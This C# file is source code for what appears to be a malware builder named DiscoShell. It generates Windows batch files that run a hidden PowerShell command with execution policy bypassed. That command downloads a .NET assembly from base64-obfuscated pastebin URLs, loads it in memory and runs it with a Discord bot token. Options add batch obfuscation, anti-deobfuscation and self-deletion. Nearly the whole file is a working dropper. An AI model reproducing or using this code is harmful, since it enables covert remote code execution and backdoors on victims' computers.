using System.Text;
using discosh.Protections;

namespace discosh
{
    public class PGen
    {
        private static string dropper_uri = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L3l0VWhldG53";
        private static string payload_uri = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0xMcXhXN01C";

        public static byte[] Generate(string token, string prefix, bool obf, bool delself, string geolock, bool ponly)
        {
            StringBuilder ret = new StringBuilder();
            Console.WriteLine("Generating...");
            StringBuilder gencode = new StringBuilder();
            gencode.AppendLine("rem https://github.com/cchash/DiscoShell");
            gencode.AppendLine(GenerateCommand(token, prefix, geolock, ponly));
            if (delself) gencode.AppendLine("(goto) 2>nul & del \"%~f0\"");
            gencode.AppendLine("exit");

            if (obf)
            {
                Console.WriteLine("Obfuscating...");
                string obfuscated = StringSplit.GenCode(gencode.ToString(), new Random(), 3);
                obfuscated = AntiDeobf.GenCode(obfuscated);
                ret.AppendLine("@echo off");
                ret.AppendLine("cls");
                ret.Append(obfuscated);
                return UTF16BOM.Process(ret.ToString());
            }
            else
            {
                ret.AppendLine("@echo off");
                ret.Append(gencode.ToString());
                return Encoding.ASCII.GetBytes(ret.ToString());
            }
        }

        public static string GenerateCommand(string token, string prefix, string geolock, bool ponly) => $"powershell -noprofile -executionpolicy bypass -windowstyle hidden -command $wc = New-Object System.Net.WebClient;$asmdata = $wc.DownloadData([System.Text.Encoding]::UTF8.GetString($wc.DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{(ponly ? payload_uri : dropper_uri)}')))));$wc.Dispose();[System.Reflection.Assembly]::Load($asmdata).EntryPoint.Invoke($null, (, [string[]] ('{Convert.ToBase64String(Encoding.UTF8.GetBytes(token))}', '{prefix}', '{geolock}')))";
    }
}
